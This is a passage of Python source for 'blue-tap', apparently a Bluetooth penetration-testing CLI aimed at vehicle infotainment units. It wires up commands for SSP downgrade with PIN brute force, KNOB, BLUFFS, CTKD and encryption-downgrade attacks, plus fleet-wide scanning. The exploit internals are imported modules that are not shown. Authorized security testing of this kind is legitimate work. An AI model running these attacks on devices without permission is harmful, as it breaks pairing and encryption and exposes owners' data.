    for i, cmd in enumerate(commands, 1):
        info(f"  {i}. {cmd}")
    console.print()

    results = []
    active_session = get_session()
    session_prefix = []
    if active_session:
        # Force subcommands to use the current session instead of spawning auto sessions.
        session_prefix = ["-s", active_session.name]
    for i, cmd_str in enumerate(commands, 1):
        # Replace TARGET / {target} placeholder
        if target_addr:
            cmd_str = re.sub(r'\bTARGET\b', target_addr, cmd_str)
            cmd_str = re.sub(r'\btarget\b', target_addr, cmd_str)
            cmd_str = cmd_str.replace("{target}", target_addr)
        # Replace {hci} placeholder
        cmd_str = cmd_str.replace("{hci}", hci_adapter)

        console.rule(f"[bold]Step {i}/{len(commands)}: {cmd_str}", style="dim")

        try:
            # Parse the command string and invoke via Click
            args = shlex.split(cmd_str)
            if args and args[0] == "run":
                error("Nested 'run' command is not supported inside workflows")
                results.append({
                    "step": i,
                    "command": cmd_str,
                    "status": "error",
                    "error": "nested_run_not_supported",
                })
                continue
            ctx = main.make_context("blue-tap", session_prefix + list(args), parent=click.get_current_context())
            with ctx:
                main.invoke(ctx)
            results.append({"step": i, "command": cmd_str, "status": "success"})
        except KeyboardInterrupt:
            warning("Workflow interrupted by user")
            results.append({"step": i, "command": cmd_str, "status": "interrupted"})
            break
        except SystemExit as e:
            status = "success" if e.code in (None, 0) else "error"
            results.append({"step": i, "command": cmd_str, "status": status})
        except click.exceptions.UsageError as e:
            error(f"Invalid command: {e}")
            results.append({"step": i, "command": cmd_str, "status": "error", "error": str(e)})
        except Exception as e:
            error(f"Command failed: {e}")
            results.append({"step": i, "command": cmd_str, "status": "error", "error": str(e)})

    console.rule("[bold]Workflow Complete", style="cyan")
    succeeded = sum(1 for r in results if r["status"] == "success")
    failed = sum(1 for r in results if r["status"] == "error")
    info(f"Results: {succeeded} succeeded, {failed} failed out of {len(results)}")
    from blue_tap.utils.session import log_command
    log_command(
        "workflow_run",
        {
            "commands": list(commands),
            "results": results,
            "succeeded": succeeded,
            "failed": failed,
        },
        category="general",
    )


# ============================================================================
# SESSION - Session Management
# ============================================================================
@main.group()
def session():
    """Manage assessment sessions."""


@session.command("list")
def session_list():
    """List all sessions."""
    sessions_dir = os.path.join(".", "sessions")
    if not os.path.isdir(sessions_dir):
        info("No sessions found")
        return

    from rich.style import Style as _S
    table = Table(title="[bold cyan]Assessment Sessions[/bold cyan]",
                  show_lines=True, border_style="#666666",
                  header_style=_S(bold=True, color="#00d4ff"))
    table.add_column("Name", style="#00d4ff")
    table.add_column("Created", style="#666666")
    table.add_column("Commands", justify="right")
    table.add_column("Targets")
    table.add_column("Last Updated", style="#666666")

    for name in sorted(os.listdir(sessions_dir)):
        meta_file = os.path.join(sessions_dir, name, "session.json")
        if os.path.exists(meta_file):
            try:
                with open(meta_file) as f:
                    meta = json.load(f)
                table.add_row(
                    name,
                    meta.get("created", "")[:19],
                    str(len(meta.get("commands", []))),
                    ", ".join(meta.get("targets", []))[:40],
                    meta.get("last_updated", "")[:19],
                )
            except (json.JSONDecodeError, OSError):
                table.add_row(name, "?", "?", "", "?")

    console.print(table)


@session.command("show")
@click.argument("name")
def session_show(name):
    """Show details of a session."""
    import os as _os
    from blue_tap.utils.session import Session
    meta_path = _os.path.join(".", "sessions", name, "session.json")
    if not _os.path.exists(meta_path):
        error(f"Session '{name}' not found")
        return
    try:
        s = Session(name)
        summary = s.summary()
        summary_panel("Session Details", {
            "Name": summary["name"],
            "Created": summary["created"],
            "Last Updated": summary["last_updated"],
            "Commands Run": str(summary["total_commands"]),
            "Targets": ", ".join(summary["targets"]) or "None",
            "Categories": ", ".join(summary["categories"]) or "None",
            "Files Saved": str(summary["files"]),
            "Directory": summary["directory"],
        })

        # Show command log
        if s.metadata.get("commands"):
            console.print("\n[bold]Command Log:[/bold]")
            for cmd in s.metadata["commands"]:
                console.print(
                    f"  [dim]{cmd.get('timestamp', '')[:19]}[/dim]  "
                    f"[cyan]{cmd.get('command', '')}[/cyan]  "
                    f"[dim]({cmd.get('category', '')})[/dim]  "
                    f"{cmd.get('target', '')}"
                )
    except Exception as e:
        error(f"Cannot load session: {e}")


# ============================================================================
# SSP-DOWNGRADE - Force Legacy Pairing
# ============================================================================
@main.group("ssp-downgrade")
def ssp_downgrade():
    """SSP downgrade attack — force legacy PIN pairing."""


@ssp_downgrade.command("probe")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
def ssp_probe(address, hci):
    """Check if target is vulnerable to SSP downgrade.

    \b
    Queries the target's pairing capabilities and determines
    if it can be forced from Secure Simple Pairing to legacy
    PIN mode where brute-force is possible.
    """
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.ssp_downgrade import SSPDowngradeAttack

    attack = SSPDowngradeAttack(address, hci=hci)
    info(f"Probing SSP capabilities for [bold]{address}[/bold]")

    result = attack.probe()
    console.print()

    from rich.table import Table
    table = Table(title="SSP Probe Results")
    table.add_column("Property", style="bold")
    table.add_column("Value")

    table.add_row("SSP Supported", "[green]Yes[/green]" if result.get("ssp_supported") else "[red]No[/red]")
    table.add_row("IO Capability", str(result.get("io_capability", "unknown")))
    table.add_row("BT Version", str(result.get("bt_version", "unknown")))
    table.add_row("Legacy Fallback", "[yellow]Possible[/yellow]" if result.get("legacy_fallback_possible") else "[green]Unlikely[/green]")

    for note in result.get("notes", []):
        table.add_row("Note", f"[dim]{note}[/dim]")

    console.print(table)

    from blue_tap.utils.session import log_command
    log_command("ssp_probe", result, category="vuln", target=address)


@ssp_downgrade.command("attack")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
@click.option("--pin-start", default=0, type=int, help="PIN range start (default: 0)")
@click.option("--pin-end", default=9999, type=int, help="PIN range end (default: 9999)")
@click.option("--delay", default=0.5, type=float, help="Delay between PIN attempts")
def ssp_attack(address, hci, pin_start, pin_end, delay):
    """Execute SSP downgrade + PIN brute force.

    \b
    Forces the target from Secure Simple Pairing to legacy PIN
    mode, then brute-forces the PIN.

    \b
    Attack phases:
      1. Disable local SSP, set IO cap to NoInputNoOutput
      2. Remove existing pairing
      3. Initiate pairing — target falls back to legacy PIN
      4. Brute force PIN from --pin-start to --pin-end
    """
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.ssp_downgrade import SSPDowngradeAttack

    if pin_start > pin_end:
        error(f"--pin-start ({pin_start}) must be <= --pin-end ({pin_end})")
        return

    attack = SSPDowngradeAttack(address, hci=hci)
    info(f"Starting SSP downgrade attack on [bold]{address}[/bold]")
    info(f"PIN range: {pin_start:04d} - {pin_end:04d}, delay: {delay}s")

    result = attack.downgrade_and_brute(pin_start=pin_start, pin_end=pin_end, delay=delay)

    console.print()
    if result.get("success"):
        pin = result.get("pin_found", "?")
        success(f"PIN found: [bold green]{pin}[/bold green]")
        success(f"Attempts: {result.get('attempts', '?')}, Time: {result.get('time_elapsed', 0):.1f}s")
    else:
        warning(f"Brute force completed without finding PIN ({result.get('attempts', 0)} attempts)")
        if result.get("lockout_detected"):
            warning("Lockout detected — target is rate-limiting pairing attempts")

    from blue_tap.utils.session import log_command
    log_command("ssp_downgrade", result, category="attack", target=address)


# ============================================================================
# KNOB - Key Negotiation of Bluetooth (CVE-2019-9506)
# ============================================================================
@main.group()
def knob():
    """KNOB attack — negotiate minimum encryption key size (CVE-2019-9506)."""


@knob.command("probe")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
def knob_probe(address, hci):
    """Check if target is vulnerable to KNOB attack.

    \b
    Checks BT version (KNOB affects 2.1-5.0 pre-patch), reads
    current encryption key size if connected, and checks if
    DarkFirmware is available for LMP-level manipulation.
    """
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.knob import KNOBAttack

    attack = KNOBAttack(address, hci=hci)
    info(f"Probing KNOB vulnerability for [bold]{address}[/bold]")

    result = attack.probe()
    console.print()

    from rich.table import Table
    table = Table(title="KNOB Probe Results")
    table.add_column("Property", style="bold")
    table.add_column("Value")

    vuln_text = "[red]Likely Vulnerable[/red]" if result.get("likely_vulnerable") else "[green]Not Vulnerable[/green]"
    table.add_row("BT Version", str(result.get("bt_version", "unknown")))
    table.add_row("KNOB Vulnerable", vuln_text)
    table.add_row("Key Size Observed", str(result.get("min_key_size_observed", "N/A")))
    table.add_row("DarkFirmware", "[green]Available[/green]" if result.get("darkfirmware_available") else "[dim]Not available[/dim]")
    table.add_row("Method", result.get("method", "N/A"))

    for detail in result.get("details", []):
        table.add_row("Detail", f"[dim]{detail}[/dim]")

    console.print(table)

    from blue_tap.utils.session import log_command
    log_command("knob_probe", result, category="vuln", target=address)


@knob.command("attack")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
@click.option("--key-size", default=1, type=int, help="Target key size in bytes (default: 1)")
def knob_attack(address, hci, key_size):
    """Execute KNOB attack — negotiate minimum key and brute force.

    \b
    Attack phases:
      1. Negotiate minimum encryption key size with target
      2. Brute force the reduced key space
      3. Report results with timing analysis

    \b
    Note: Full LMP manipulation requires DarkFirmware (RTL8761B).
    Without it, uses btmgmt to set local minimum key size (limited effectiveness).
    """
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.knob import KNOBAttack

    attack = KNOBAttack(address, hci=hci)
    info(f"Executing KNOB attack on [bold]{address}[/bold]")
    info(f"Target key size: {key_size} byte(s) ({key_size * 8} bits, {2 ** (key_size * 8):,} candidates)")

    result = attack.execute()

    console.print()
    negotiate = result.get("negotiate", {})
    brute = result.get("brute_force", {})

    if negotiate.get("success"):
        success(f"Key negotiated to {negotiate.get('negotiated_key_size', '?')} byte(s)")
    else:
        warning(f"Key negotiation: {negotiate.get('method', 'N/A')}")

    if brute.get("key_found"):
        success(f"Key recovered: [bold green]{brute.get('key_hex', '?')}[/bold green]")
        success(f"Candidates tested: {brute.get('total_candidates', '?')}, Time: {brute.get('time_elapsed', 0):.2f}s")
    else:
        info(f"Brute force demonstration: {brute.get('total_candidates', '?')} candidates in {brute.get('time_elapsed', 0):.2f}s")

    from blue_tap.utils.session import log_command
    log_command("knob_attack", result, category="attack", target=address)


# ============================================================================
# BLUFFS - Session Key Downgrade (CVE-2023-24023)
# ============================================================================
@main.command("bluffs")
@click.argument("target", required=False, default=None)
@click.option("-v", "--variant", default="probe",
              type=click.Choice(["probe", "key-downgrade", "sc-downgrade", "all"]),
              help="Attack variant (default: probe)")
@click.option("-i", "--hci", default="hci0")
@click.option("--phone", default=None, help="Paired phone MAC for identity cloning (optional)")
def bluffs_attack(target, variant, hci, phone):
    """BLUFFS session key downgrade attack (CVE-2023-24023).

    \b
    Exploits BR/EDR session key derivation weaknesses to force weak,
    reusable session keys. Requires DarkFirmware on RTL8761B.

    \b
    Variants:
      probe          - Check if target is vulnerable (SC downgrade test) [safe]
      key-downgrade  - LSC Central: force minimum encryption key size (A1)
      sc-downgrade   - SC Central downgrade: reject SC, then apply A1 (A3)
      all            - Run probe, then sc-downgrade, then key-downgrade
    """
    target = resolve_address(target)
    if not target:
        return
    from blue_tap.attack.bluffs import BLUFFSAttack

    # Map user-friendly names to internal variant names
    _variant_map = {
        "probe": "probe",
        "key-downgrade": "a1",
        "sc-downgrade": "a3",
    }

    phone_address = ""
    if phone:
        phone_address = phone

    attack = BLUFFSAttack(target, phone_address=phone_address, hci=hci)
    info(f"Executing BLUFFS {variant.upper()} against [bold]{target}[/bold]")

    try:
        if variant == "all":
            # Run probe, then sc-downgrade (a3), then key-downgrade (a1)
            results = []
            for v in ["probe", "a3", "a1"]:
                info(f"--- Running BLUFFS {v.upper()} ---")
                results.append(attack.execute(variant=v))
            result = {
                "variant": "all",
                "success": any(r.get("success") for r in results),
                "details": [d for r in results for d in r.get("details", [])],
                "sub_results": results,
            }
        else:
            internal_variant = _variant_map.get(variant, variant)
            result = attack.execute(variant=internal_variant)

        console.print()
        if result.get("success"):
            success(f"BLUFFS {variant.upper()} completed successfully")
        elif variant == "probe" or (variant == "all" and result.get("sub_results")):
            vuln_result = result if variant == "probe" else result.get("sub_results", [{}])[0]
            if vuln_result.get("vulnerable"):
                warning(f"Target appears vulnerable to BLUFFS (confidence: {vuln_result.get('confidence', 'unknown')})")
            else:
                info("Target does not appear vulnerable to BLUFFS")
        else:
            warning(f"BLUFFS {variant.upper()} did not confirm exploitation")

        for detail in result.get("details", []):
            info(f"  {detail}")

        from blue_tap.utils.session import log_command
        log_command("bluffs_attack", result, category="attack", target=target)
    except Exception as exc:
        error(f"BLUFFS attack failed: {exc}")


# ============================================================================
# CTKD - Cross-Transport Key Derivation (BLURtooth)
# ============================================================================
@main.command("ctkd")
@click.argument("target", required=False, default=None)
@click.option("-m", "--mode", type=click.Choice(["probe", "monitor"]), default="probe",
              help="probe: one-shot CTKD test | monitor: watch key material changes")
@click.option("-i", "--interface", "hci", default="hci1", help="HCI device with DarkFirmware")
@click.option("--interval", type=float, default=3.0, help="Monitor polling interval (seconds)")
def ctkd_cmd(target, mode, hci, interval):
    """Test for Cross-Transport Key Derivation (CVE-2020-15802).

    \b
    Checks whether a dual-mode (BR/EDR + BLE) target shares key material
    across transports.  A Classic attack (KNOB) can compromise BLE keys
    if CTKD is active.

    \b
    Requires DarkFirmware for connection table inspection.

    \b
    Examples:
      sudo blue-tap ctkd AA:BB:CC:DD:EE:FF              # Probe for CTKD
      sudo blue-tap ctkd AA:BB:CC:DD:EE:FF -m monitor    # Watch key changes
    """
    from blue_tap.attack.ctkd import CTKDAttack

    target = target or _resolve_target()
    if not target:
        return

    attack = CTKDAttack(target, hci)

    if mode == "probe":
        result = attack.probe()
        _log_attack_result("ctkd", result)
        if result.get("vulnerable"):
            success(f"CTKD: Target {target} may be VULNERABLE")
        else:
            info(f"CTKD: No vulnerability detected on {target}")
    elif mode == "monitor":
        attack.monitor(interval=interval)


# ENCRYPTION-DOWNGRADE - Beyond KNOB
# ============================================================================
@main.command("encryption-downgrade")
@click.argument("target", required=False, default=None)
@click.option("-m", "--method", default="all",
              type=click.Choice(["no-encryption", "force-renegotiation",
                                 "reject-secure-connections", "all"]),
              help="Attack method (default: all)")
@click.option("-i", "--hci", default="hci0")
def encryption_downgrade(target, method, hci):
    """Encryption downgrade attacks beyond KNOB (CVE-2019-9506).

    \b
    Alternative encryption downgrade paths via DarkFirmware LMP injection:
      no-encryption              - LMP_ENCRYPTION_MODE_REQ(mode=0) to turn off encryption
      force-renegotiation        - Alternating STOP/START to force weaker re-negotiation
      reject-secure-connections  - Reject SC to force Legacy SC (weaker keys)
      all                        - Run all methods sequentially

    \b
    Requires DarkFirmware loaded on RTL8761B adapter and an active
    ACL connection to the target device.
    """
    target = resolve_address(target)
    if not target:
        return
    from blue_tap.attack.encryption_downgrade import EncryptionDowngradeAttack

    attack = EncryptionDowngradeAttack(target, hci=hci)
    info(f"Running encryption downgrade ({method}) against [bold]{target}[/bold]")

    try:
        result = attack.execute(method=method)

        console.print()
        vulnerable = result.get("vulnerable_methods", [])
        if vulnerable:
            from rich.panel import Panel
            console.print(Panel(
                f"[bold red]Encryption downgrade succeeded via: {', '.join(vulnerable)}[/bold red]\n\n"
                f"The target accepted PDUs that weaken or disable encryption.\n"
                f"This indicates the link manager does not properly enforce\n"
                f"encryption requirements.",
                title="Vulnerability Confirmed",
                border_style="red",
            ))
        else:
            info("No encryption downgrade methods succeeded against this target")

        # Print method results
        from rich.table import Table
        table = Table(title="Encryption Downgrade Results")
        table.add_column("Method", style="bold")
        table.add_column("Status")
        table.add_column("Responses")

        for m_name, m_result in result.get("methods", {}).items():
            resp_count = len(m_result.get("responses", []))
            if m_result.get("vulnerable"):
                status = "[bold red]VULNERABLE[/bold red]"
            elif m_result.get("accepted_count", 0) > 0:
                status = "[yellow]Partially Accepted[/yellow]"
            elif m_result.get("error"):
                status = f"[red]Error: {m_result['error']}[/red]"
            else:
                status = "[green]Rejected[/green]"
            table.add_row(m_name, status, str(resp_count))

        console.print(table)

        from blue_tap.utils.session import log_command
        log_command("encryption_downgrade", result, category="attack", target=target)
    except Exception as exc:
        error(f"Encryption downgrade failed: {exc}")


# ============================================================================
# FLEET - Fleet-Wide Assessment
# ============================================================================
@main.group()
def fleet():
    """Fleet-wide Bluetooth assessment — scan, classify, and vulnscan multiple devices."""


@fleet.command("scan")
@click.option("-d", "--duration", default=15, type=int, help="Scan duration in seconds")
@click.option("-i", "--hci", default="hci0")
def fleet_scan(duration, hci):
    """Scan and classify all nearby Bluetooth devices.

    \b
    Discovers Classic and BLE devices, classifies each as:
    IVI, phone, headset, computer, wearable, or unknown.
    """
    from blue_tap.attack.fleet import FleetAssessment

    assessment = FleetAssessment(hci=hci, scan_duration=duration)
    info(f"Scanning for {duration}s...")

    devices = assessment.scan()
    if not devices:
        warning("No devices discovered")
        return

    from rich.table import Table
    table = Table(title=f"Discovered Devices ({len(devices)})")
    table.add_column("Address", style="bold")
    table.add_column("Name")
    table.add_column("RSSI")
    table.add_column("Type")
    table.add_column("Classification", style="bold")

    class_colors = {"ivi": "red", "phone": "cyan", "headset": "yellow",
                    "computer": "blue", "wearable": "magenta", "unknown": "dim"}

    for dev in devices:
        cls = dev.get("classification", "unknown")
        color = class_colors.get(cls, "white")
        table.add_row(
            dev.get("address", "?"),
            dev.get("name", "Unknown"),
            str(dev.get("rssi", "")),
            dev.get("type", "Classic"),
            f"[{color}]{cls.upper()}[/{color}]",
        )
    console.print(table)

    ivi_count = sum(1 for d in devices if d.get("classification") == "ivi")
    phone_count = sum(1 for d in devices if d.get("classification") == "phone")
    info(f"Found: {ivi_count} IVI(s), {phone_count} phone(s), {len(devices) - ivi_count - phone_count} other(s)")

    from blue_tap.utils.session import log_command
    log_command("fleet_scan", devices, category="scan")


@fleet.command("vulnscan")
@click.option("-d", "--duration", default=15, type=int, help="Scan duration")
@click.option("-i", "--hci", default="hci0")
@click.option("--all-devices", is_flag=True, help="Assess all devices, not just IVIs")
def fleet_assess(duration, hci, all_devices):
    """Scan, classify, and run vulnerability scans on all IVIs.

    \b
    By default, only scans devices classified as IVI.
    Use --all-devices to scan everything discovered.
    """
    from blue_tap.attack.fleet import FleetAssessment

    assessment = FleetAssessment(hci=hci, scan_duration=duration)
    info(f"Scanning for {duration}s...")

    devices = assessment.scan()
    if not devices:
        warning("No devices discovered")
        return

    device_class = None if all_devices else "ivi"
    class_label = "all devices" if all_devices else "IVIs"
    targets_to_assess = [d["address"] for d in devices
                         if device_class is None or d.get("classification") == device_class]

    if not targets_to_assess:
        warning(f"No {class_label} found to scan")
        return

    info(f"Running vulnscan on {len(targets_to_assess)} {class_label}...")
    results = assessment.assess(targets=targets_to_assess)

    console.print()
    risk_color = "dim"
    for dev_result in results:
        addr = dev_result.get("address", "?")
        risk = dev_result.get("risk_rating", "UNKNOWN")
        findings = dev_result.get("findings", [])
        risk_color = {"CRITICAL": "red", "HIGH": "red", "MEDIUM": "yellow",
                      "LOW": "green"}.get(risk, "dim")

        console.print(f"[bold]{addr}[/bold] — [{risk_color}]{risk}[/{risk_color}] ({len(findings)} findings)")
        for f in findings[:3]:
            sev = f.get("severity", "?")
            console.print(f"  [{sev.lower() if sev in ('HIGH','CRITICAL') else 'dim'}]{sev}[/] {f.get('name', '?')}")
        if len(findings) > 3:
            console.print(f"  [dim]... and {len(findings) - 3} more[/dim]")

    report = assessment.report()
    from blue_tap.utils.session import log_command
    log_command("fleet_assess", report, category="vuln")

    console.print()
    success(f"Fleet vulnscan complete: {report.get('assessed', 0)} devices scanned, "
            f"overall risk: [{risk_color}]{report.get('overall_risk', '?')}[/{risk_color}]")


@fleet.command("report")
@click.option("-d", "--duration", default=15, type=int, help="Scan duration")
@click.option("-i", "--hci", default="hci0")
@click.option("-o", "--output", default=None, help="Output file path")
@click.option("-f", "--format", "fmt", default="html", type=click.Choice(["html", "json"]))
@click.option("--all-devices", is_flag=True, help="Assess all devices, not just IVIs")
def fleet_report(duration, hci, output, fmt, all_devices):
    """Generate a consolidated fleet vulnerability report."""
    from blue_tap.attack.fleet import FleetAssessment

    assessment = FleetAssessment(hci=hci, scan_duration=duration)
    info("Running full fleet vulnerability workflow (scan + classify + vulnscan)...")

    devices = assessment.scan()
    if not devices:
        warning("No devices discovered")
        return

    if all_devices:
        targets = [d["address"] for d in devices]
    else:
        targets = [d["address"] for d in devices if d.get("classification") == "ivi"]

    if targets:
        assessment.assess(targets=targets)
    else:
        warning("No devices to scan")

    report_data = assessment.report()

    out_path = output or f"fleet_report.{fmt}"
    if fmt == "json":
        _save_json(report_data, out_path)
    else:
        from blue_tap.report.generator import ReportGenerator
        rpt = ReportGenerator()
        rpt.add_scan_results(devices)
        for dev in report_data.get("devices", []):
            findings = dev.get("findings", [])
            if findings:
                rpt.add_vuln_findings(findings)
        rpt.generate_html(out_path)

    from blue_tap.utils.session import log_command
    log_command("fleet_report", report_data, category="vuln")


# ============================================================================
# UTILITIES
# ============================================================================
def _save_json(data, filepath):
    """Save data to JSON file."""
    os.makedirs(os.path.dirname(filepath) if os.path.dirname(filepath) else ".", exist_ok=True)
    with open(filepath, "w") as f:
        json.dump(data, f, indent=2, default=str)
    success(f"Saved: {filepath}")


@main.command("demo", hidden=True)
@click.option("-o", "--output", default="demo_output", help="Output directory")
def demo_cmd(output):
    """Run a full demo pentest with simulated IVI data (no hardware needed)."""
    from blue_tap.demo.runner import run_demo
    run_demo(output_dir=output)


def _check_privileges() -> bool:
    """Check if running with root/sudo.  Returns True if privileged."""
    import os
    return os.geteuid() == 0


# Commands that can run without root
_NO_ROOT_COMMANDS = {"--help", "-h", "--version", "demo"}


def cli():
    """Entry point that shows the banner before any Click processing."""
    import sys

    banner()

    # Allow --help, --version, and demo without root
    args_lower = {a.lower().lstrip("-") for a in sys.argv[1:]}
    raw_args = set(sys.argv[1:])

    needs_root_check = True
    if not sys.argv[1:]:
        needs_root_check = False  # No args = show help
    elif raw_args & {"--help", "-h", "--version"}:
        needs_root_check = False
    elif args_lower & {"help", "version"}:
        needs_root_check = False
    elif "demo" in args_lower:
        needs_root_check = False

    if needs_root_check and not _check_privileges():
        error(
            "Blue-Tap requires root privileges for most operations.\n"
            "\n"
            "  Why: Raw HCI sockets, L2CAP/RFCOMM sockets, adapter control,\n"
            "       DarkFirmware VSC commands, and firmware writes all require\n"
            "       root or CAP_NET_RAW.\n"
            "\n"
            "  Run with:  [bold]sudo blue-tap[/bold] <command>\n"
            "\n"
            "  Or grant capabilities:  sudo setcap cap_net_raw+eip $(which python3)\n"
            "\n"
            "  Commands that work without root: --help, --version, demo"
        )
        sys.exit(1)

    main()


if __name__ == "__main__":
    cli()
